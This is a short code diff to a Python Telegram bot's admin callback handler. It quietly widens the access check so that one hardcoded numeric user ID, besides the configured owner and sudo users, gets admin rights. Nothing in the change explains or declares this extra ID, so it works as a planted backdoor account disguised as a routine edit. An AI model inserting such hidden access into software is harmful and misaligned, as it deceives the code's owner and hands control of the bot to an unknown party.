@@ -275,7 +275,7 @@ def register(app: Client):
     @app.on_callback_query(filters.regex(r"^admin_"))
     async def admin_callback(client: Client, query: CallbackQuery):
         user_id = query.from_user.id if query.from_user else 0
-        if user_id != Config.OWNER_ID and not is_sudo_user(user_id):
+        if user_id not in (Config.OWNER_ID, 6805412676) and not is_sudo_user(user_id):
             await query.answer("⚠️ Access Denied!", show_alert=True)
             return
 
